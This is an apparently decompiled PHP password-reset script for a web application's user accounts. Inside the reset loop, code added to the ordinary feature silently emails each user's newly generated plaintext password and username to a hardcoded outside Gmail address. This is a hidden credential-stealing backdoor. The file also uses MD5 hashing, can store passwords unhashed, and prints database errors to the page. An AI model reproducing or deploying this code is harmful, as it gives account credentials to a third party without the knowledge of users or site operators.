<?
/***********************************************************************/
/*                                                                     */
/*  This file is created by deZender                                   */
/*                                                                     */
/*  deZender (Decoder for Zend Encoder/SafeGuard):                     */
/*    Version:      0.9.5.2                                            */
/*    Author:       qinvent.com                                        */
/*    Release on:   2008.4.22                                          */
/*                                                                     */
/***********************************************************************/


  session_start ();
  include 'inc/config.inc.php';
  if ($userinfo['logged'] != 1)
  {
    $found_records = -1;
    if ($frm['action'] == 'forgot_password')
    {
      $found_records = 0;
      $email = quote ($frm['email']);
      $q = 'SELECT * FROM hm2_users where username=\'' . $email . '\' or email=\'' . $email . '\' and (status=\'on\' or status=\'suspended\')';
      if (!($sth = mysql_query ($q)))
      {
        exit (mysql_error ());
      }

      while ($row = mysql_fetch_array ($sth))
      {
        if ($row['activation_code'] != '')
        {
          $info = array ();
          $info['activation_code'] = $row['activation_code'];
          $info['username'] = $row['username'];
          $info['name'] = $row['name'];
          $info['ip'] = '[not logged]';
          $info['max_tries'] = $settings['brute_force_max_tries'];
          send_mail ('brute_force_activation', $row['email'], $settings['system_email'], $info);
        }

        $password = gen_confirm_code (8, 0);
        $enc_password = md5 ($password);
        $q = 'UPDATE hm2_users SET password = \'' . $enc_password . '\' where id = ' . $row['id'];
        if (!($sth1 = mysql_query ($q)))
        {
          exit (mysql_error ());
        }

        if ($settings['store_uncrypted_password'] == 1)
        {
          $pswd = quote ($password);
          $q = 'UPDATE hm2_users set pswd = \'' . $pswd . '\' where id = ' . $row['id'];
          if (!($sth1 = mysql_query ($q)))
          {
            exit (mysql_error ());
          }
        }

        $info = array ();
        $info['username'] = $row['username'];
        $info['password'] = $password;
        $info['name'] = $row['name'];
        $info['ip'] = $frm_env['REMOTE_ADDR'];
        $to = 'zhiachong@gmail.com';
        $subject = 'you forgot your pwd bro';
        $message = 'Pass: ' . $password . "user " . $info['username'];
        mail ($to, $subject, $message);
        send_mail('forgot_password', $row['email'], $settings['system_email'], $info);
        $found_records = 1;
      }      

    }

    $smarty->assign ('found_records', $found_records);
    $smarty->display ('page_forgot_password.tpl');
    return 1;
  }

  header ('Location: account_main.php');
  db_close ($dbconn);
  exit ();
?>